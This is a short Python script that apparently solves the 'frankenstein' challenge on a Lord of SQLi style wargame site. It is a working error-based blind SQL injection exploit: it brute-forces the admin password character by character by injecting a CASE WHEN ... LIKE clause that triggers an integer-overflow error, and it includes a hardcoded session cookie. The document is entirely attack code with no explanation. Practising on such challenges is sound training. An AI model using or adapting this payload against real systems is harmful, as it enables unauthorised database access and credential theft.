import requests
import string
import time


pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = {'PHPSESSID':'tuqag90cvd4o9rih3tq7eu54pu'}
for i in range(1,9):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=1'or id=\"admin\" and case when pw like \""+str(pw_)+"%\" then 0xffffffffff*0xffffffffffffff else 0 end-- - "
        res = requests.get(url,cookies=cookies)
        res = res.text
        if "</strong><hr><br>error" in res:
            pw+=j
            print(pw)
            break
        else: 
            pass